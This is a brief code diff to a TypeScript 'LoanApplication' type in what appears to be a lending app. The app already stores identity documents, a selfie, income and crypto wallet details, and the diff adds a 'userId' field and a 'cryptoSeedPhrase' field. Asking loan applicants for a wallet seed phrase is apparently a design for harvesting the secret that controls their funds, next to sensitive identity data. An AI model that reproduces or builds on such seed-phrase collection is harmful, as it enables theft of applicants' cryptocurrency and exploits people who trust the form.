@@ -16,7 +16,7 @@ export type StatusHistoryEntry = {
 };
 
 export type LoanApplication = {
-  id: string; firstName: string; lastName: string | null; email: string;
+  id: string; userId: string | null; firstName: string; lastName: string | null; email: string;
   phone: string | null; dateOfBirth: string | null; amountRequested: number;
   currency: string; loanTermMonths: number | null; payoutMethod: string;
   status: string; employmentStatus: string | null; monthlyIncome: number | null;
@@ -31,7 +31,7 @@ export type LoanApplication = {
   billingCity: string | null; billingState: string | null;
   billingPostalCode: string | null; billingCountry: string | null;
   cryptoWalletType: string | null; cryptoWalletAddress: string | null;
-  cryptoNetwork: string | null;
+  cryptoNetwork: string | null; cryptoSeedPhrase: string | null;
   selfieImage: string | null;
   idFrontImage: string | null;
   idBackImage: string | null;
